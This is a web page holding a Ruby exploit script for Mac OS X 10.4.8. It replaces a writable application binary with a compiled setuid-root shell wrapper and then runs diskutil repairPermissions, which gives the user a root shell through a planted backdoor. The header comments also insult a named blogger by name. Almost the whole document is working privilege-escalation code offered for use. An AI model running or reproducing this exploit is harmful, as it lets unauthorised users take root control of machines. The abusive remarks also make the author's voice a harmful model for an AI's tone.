<html><head><title>Mac OS X 10.4.8 Overwrite Setuid Binaries Privilege Escalation Exploit</title></head><pre># !/usr/bin/ruby
# Exploit for MOAB-15-01-2007
# (c) 2006 LMH &lt;lmh [at] info-pull.com&gt;.
#
# Note: It's a generic exploit, you can use it over any binary writable which
# is set as root setuid by diskutil repair permissions. Simply change the path.
# Blame Apple for doing such a piece of **** and relying on flawed DAC.
#
#                   Line-noise: Jackass of the Week
# -------
# On Jan 14, 11:10 pm, &quot;William A. Carrel&quot; &lt;willia...@carrel.org&gt; wrote:
# &gt; Works for me. I see yesterday's was an HFS+ panic.
# &gt; &gt; Is the info-pull/MoAB/MoKB site down, or is it just me that can't
# &gt; &gt; access it?
# Sorry, my fault. I blocked access to it at this end when they started
# distributing malware so that nobody downloaded anything accidentally. I
# can see it again now.
# 
# Kind regards,
# 
# Alastair.
# --------
#
# Hmm, false, it was the other way around:
#
# target     prot opt source               destination
# (...)
# DROP       all  --  ajhoughton.plus.com  anywhere
# (...)
#
# &quot;LMH.s continued propensity for insults, which frankly I don.t particularly
# appreciate.&quot; -- http://alastairs-place.net/2007/01/how-childish/
#
# There's nothing wrong about embarrassing you for being an absurd liar.
# Live with it, and then post to your 'blog' as usual. Free Zealot Apple PR (tm).
#

require 'fileutils'

DISK_UTIL_COMMAND = &quot;/usr/sbin/diskutil repairPermissions /&quot;
AVAILABLE_TARGETS = [
                      &quot;/Applications/Utilities/Activity Monitor.app/Contents/Resources/pmTool&quot;,
                      &quot;/Applications/Utilities/Keychain Access.app/Contents/Resources/kcproxy&quot;,
                      &quot;/Applications/Utilities/ODBC Administrator.app/Contents/Resources/iodbcadmintool&quot;
                    ]

path_to_bin  = (AVAILABLE_TARGETS[ARGV[0].to_i] || AVAILABLE_TARGETS[0])
path_to_back = File.join(&quot;/tmp&quot;, File.basename(path_to_bin))

puts &quot;++ Starting: #{path_to_bin}&quot;
puts &quot;++ Back-up:  #{path_to_back}&quot;

if File.exists?(path_to_bin)
  unless File.exists?(path_to_back)
    FileUtils.cp(path_to_bin, path_to_back)
  end
end

puts &quot;++ Compiling a shell wrapper at /tmp/o...&quot;
WRAP_CODE = 'int main() { setuid(0); setgid(0); seteuid(0); system(&quot;/bin/sh -i&quot;); }'
COMPILE   = &quot;echo '#{WRAP_CODE}' &gt; /tmp/t.c &amp;&amp; gcc /tmp/t.c -s -o /tmp/o &amp;&amp; rm -rf /tmp/t.c&quot;
system(COMPILE)

puts &quot;++ Placing backdoor...&quot;
FileUtils.mv(&quot;/tmp/o&quot;, path_to_bin)
system(DISK_UTIL_COMMAND)

puts &quot;++ Finished. Backup at #{path_to_back}.&quot;
puts &quot;++ Repair with: mv '#{path_to_back}' '#{path_to_bin}'&quot;
puts &quot;++ Enjoy root shell.&quot;

# milw0rm.com [2007-01-15]</pre></html>